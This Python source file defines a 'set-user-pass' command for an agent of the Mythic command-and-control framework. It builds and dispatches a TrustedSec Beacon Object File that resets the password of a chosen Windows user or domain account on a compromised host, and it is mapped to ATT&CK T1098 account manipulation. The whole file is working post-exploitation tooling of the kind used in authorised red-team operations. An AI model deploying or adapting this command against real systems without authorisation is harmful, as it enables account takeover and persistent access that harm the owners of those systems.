from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import binascii
import cmd 
import struct
import os
import subprocess

class OfArg:
    def __init__(self, arg_data, arg_type):
        self.arg_data = arg_data
        self.arg_type = arg_type

def generateWString(arg):
    return OfArg(arg.encode('utf-16le') + b'\x00\x00', 0)

def generateString(arg):
    return OfArg(arg.encode('ascii') + b'\x00', 0)

def generate32bitInt(arg):
    return OfArg(struct.pack('<I', int(arg)), 1)

def generate16bitInt(arg):
    return OfArg(struct.pack('<H', int(arg)), 2)

def dobinarystuff(arg):
    return OfArg(arg)

def SerialiseArgs(OfArgs):
    output_bytes = b''
    for of_arg in OfArgs:
        output_bytes += struct.pack('<I', of_arg.arg_type)
        output_bytes += struct.pack('<I', len(of_arg.arg_data))
        output_bytes += of_arg.arg_data
    return output_bytes

class SetUserPassArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Required. The target username.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                description="Required. The new password. The password must meet GPO requirements",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        )
                    ],
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                description="Optional. The domain/computer for the account. You must give the domain name for the user if it is a domain account.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=False,
                        )
                    ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            raise ValueError("Missing arguments")
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)
    

class SetUserPassCommand(CommandBase):
    cmd = "set-user-pass"
    needs_admin = False
    help_cmd = """
Summary: Sets the password for the specified user account on the target computer. 
Usage:   set-user-pass -username checkymander -password P@ssw0rd! -domain METEOR
         username  Required. The user name to activate/enable. 
         password  Required. The new password. The password must meet GPO 
                   requirements.
         domain    Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account.

Credit: The TrustedSec team for the original BOF. - https://github.com/trustedsec/CS-Remote-OPs-BOF
    """
    description = "Sets the password for the specified user account on the target computer. "
    version = 1
    script_only = True
    supported_ui_features = []
    author = "@TrustedSec"
    argument_class = SetUserPassArguments
    attackmapping = ["T1098"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        arch = taskData.Callback.Architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        bof_path = os.path.join(self.agent_code_path, "../")
        bof_path = f"/Mythic/athena/mythic/agent_functions/trusted_sec_remote_bofs/setuserpass/setuserpass.{arch}.o"
        if(os.path.isfile(bof_path) == False):
            await self.compile_bof("/Mythic/athena/mythic/agent_functions/trusted_sec_remote_bofs/setuserpass/")

        # Read the COFF file from the proper directory
        with open(bof_path, "rb") as coff_file:
            encoded_file = base64.b64encode(coff_file.read())

        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
        file_resp = await MythicRPC().execute("create_file",
                                   task_id=taskData.Task.ID,
                                    file=encoded_file,
                                    delete_after_fetch=True)  
        
        encoded_args = ""
        OfArgs = []
        domain = taskData.args.get_arg("domain")
        if domain:
            OfArgs.append(generateWString(domain))
        else:
            OfArgs.append(generateWString("")) # if no domain is specified, just pass an empty string to represent localhost

        username = taskData.args.get_arg("username")
        OfArgs.append(generateWString(username))
        password = taskData.args.get_arg("password")
        OfArgs.append(generateWString(password))


        encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()

        resp = await MythicRPC().execute("create_subtask_group", tasks=[
            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"60"}},
            ], 
            subtask_group_name = "coff", parent_task_id=taskData.Task.ID)

        # We did it!
        return response

    async def process_response(self, response: AgentResponse):
        pass

    async def compile_bof(self, bof_path):
        p = subprocess.Popen(["make"], cwd=bof_path)
        p.wait()
        streamdata = p.communicate()[0]
        rc = p.returncode
        if rc != 0:
            raise Exception("Error compiling BOF: " + str(streamdata))
